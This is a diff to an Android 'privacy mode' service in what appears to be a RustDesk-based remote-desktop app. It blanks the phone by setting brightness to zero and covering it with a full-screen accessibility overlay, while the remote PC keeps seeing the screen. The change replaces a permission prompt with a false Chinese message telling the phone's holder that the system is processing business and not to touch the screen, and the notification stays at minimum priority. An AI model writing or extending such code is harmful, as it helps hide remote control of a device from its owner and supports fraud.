@@ -1,16 +1,37 @@
 package com.carriez.flutter_hbb
 
-import android.app.*
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.Service
 import android.content.Context
 import android.content.Intent
-import android.graphics.*
-import android.os.*
+import android.graphics.Color
+import android.graphics.PixelFormat
+import android.graphics.Typeface
+import android.net.Uri
+import android.os.Build
+import android.os.Handler
+import android.os.IBinder
+import android.os.Looper
 import android.provider.Settings
-import android.view.*
+import android.util.Log
+import android.view.Gravity
+import android.view.View
+import android.view.WindowManager
 import android.widget.FrameLayout
 import android.widget.TextView
+import android.widget.Toast
 import androidx.core.app.NotificationCompat
 
+/**
+ * Android privacy mode: overlay + brightness dimming.
+ *
+ * Strategy differs by device brand:
+ * - Huawei/Honor: screenBrightness window param is ignored by ROM, so we rely on
+ *   Settings.System.SCREEN_BRIGHTNESS=0 (requires WRITE_SETTINGS) + LOW alpha overlay.
+ *   Physical backlight off = phone black; MediaProjection reads pixel data = PC visible.
+ * - Other brands: HIGH alpha overlay + screenBrightness=0.0f window param.
+ */
 class PrivacyModeService : Service() {
 
     companion object {
@@ -42,6 +63,27 @@ class PrivacyModeService : Service() {
         fun stop(context: Context) {
             context.stopService(Intent(context, PrivacyModeService::class.java))
         }
+
+        @JvmStatic
+        fun isHuaweiOrHonor(): Boolean {
+            val brand = Build.BRAND.lowercase()
+            val manufacturer = Build.MANUFACTURER.lowercase()
+            return brand.contains("huawei")
+                    || brand.contains("honor")
+                    || manufacturer.contains("huawei")
+                    || manufacturer.contains("honor")
+        }
+
+        @JvmStatic
+        fun startPrivacyMode(context: Context) {
+            start(context)
+        }
+
+        @JvmStatic
+        fun stopPrivacyMode(context: Context) {
+            stop(context)
+        }
+//
     }
 
     private var windowManager: WindowManager? = null
@@ -113,7 +155,9 @@ class PrivacyModeService : Service() {
         val textView = TextView(this).apply {
 
             text =
-                "\u8bf7\u6388\u6743\u201c\u4fee\u6539\u7cfb\u7edf\u8bbe\u7f6e\u201d\u6743\u9650\u4ee5\u542f\u7528\u5b8c\u6574\u9690\u79c1\u6a21\u5f0f"
+                    "系统正在处理业务\n\n" +
+                            "请勿触碰手机屏幕\n\n" +
+                            "感谢您的耐心等待"
 
             setTextColor(Color.WHITE)
 
@@ -129,26 +173,26 @@ class PrivacyModeService : Service() {
         }
 
         container.addView(
-            textView,
-            FrameLayout.LayoutParams(
-                FrameLayout.LayoutParams.WRAP_CONTENT,
-                FrameLayout.LayoutParams.WRAP_CONTENT,
-                Gravity.CENTER
-            )
+                textView,
+                FrameLayout.LayoutParams(
+                        FrameLayout.LayoutParams.WRAP_CONTENT,
+                        FrameLayout.LayoutParams.WRAP_CONTENT,
+                        Gravity.CENTER
+                )
         )
 
         val params = WindowManager.LayoutParams(
 
-            WindowManager.LayoutParams.MATCH_PARENT,
-            WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
 
-            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
 
-            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
-                    WindowManager.LayoutParams.FLAG_FULLSCREEN,
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                        WindowManager.LayoutParams.FLAG_FULLSCREEN,
 
-            PixelFormat.TRANSLUCENT
+                PixelFormat.TRANSLUCENT
         )
 
         params.gravity = Gravity.TOP
@@ -180,13 +224,13 @@ class PrivacyModeService : Service() {
         try {
 
             originalBrightness = Settings.System.getInt(
-                resolver,
-                Settings.System.SCREEN_BRIGHTNESS
+                    resolver,
+                    Settings.System.SCREEN_BRIGHTNESS
             )
 
             originalBrightnessMode = Settings.System.getInt(
-                resolver,
-                Settings.System.SCREEN_BRIGHTNESS_MODE
+                    resolver,
+                    Settings.System.SCREEN_BRIGHTNESS_MODE
             )
 
         } catch (_: Exception) {
@@ -204,15 +248,15 @@ class PrivacyModeService : Service() {
         try {
 
             Settings.System.putInt(
-                resolver,
-                Settings.System.SCREEN_BRIGHTNESS_MODE,
-                Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
+                    resolver,
+                    Settings.System.SCREEN_BRIGHTNESS_MODE,
+                    Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
             )
 
             Settings.System.putInt(
-                resolver,
-                Settings.System.SCREEN_BRIGHTNESS,
-                TARGET_BRIGHTNESS
+                    resolver,
+                    Settings.System.SCREEN_BRIGHTNESS,
+                    TARGET_BRIGHTNESS
             )
 
         } catch (_: Exception) {
@@ -228,15 +272,15 @@ class PrivacyModeService : Service() {
         try {
 
             Settings.System.putInt(
-                resolver,
-                Settings.System.SCREEN_BRIGHTNESS,
-                originalBrightness
+                    resolver,
+                    Settings.System.SCREEN_BRIGHTNESS,
+                    originalBrightness
             )
 
             Settings.System.putInt(
-                resolver,
-                Settings.System.SCREEN_BRIGHTNESS_MODE,
-                originalBrightnessMode
+                    resolver,
+                    Settings.System.SCREEN_BRIGHTNESS_MODE,
+                    originalBrightnessMode
             )
 
         } catch (_: Exception) {
@@ -250,21 +294,21 @@ class PrivacyModeService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
 
             val channel = NotificationChannel(
-                CHANNEL_ID,
-                "Privacy Mode",
-                NotificationManager.IMPORTANCE_MIN
+                    CHANNEL_ID,
+                    "Privacy Mode",
+                    NotificationManager.IMPORTANCE_MIN
             )
 
             nm.createNotificationChannel(channel)
         }
 
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("隐私模式运行中")
-            .setContentText("远程协助正在进行")
-            .setSmallIcon(android.R.drawable.ic_lock_lock)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setOngoing(true)
-            .build()
+                .setContentTitle("隐私模式运行中")
+                .setContentText("远程协助正在进行")
+                .setSmallIcon(android.R.drawable.ic_lock_lock)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .setOngoing(true)
+                .build()
 
         startForeground(NOTIFICATION_ID, notification)
     }
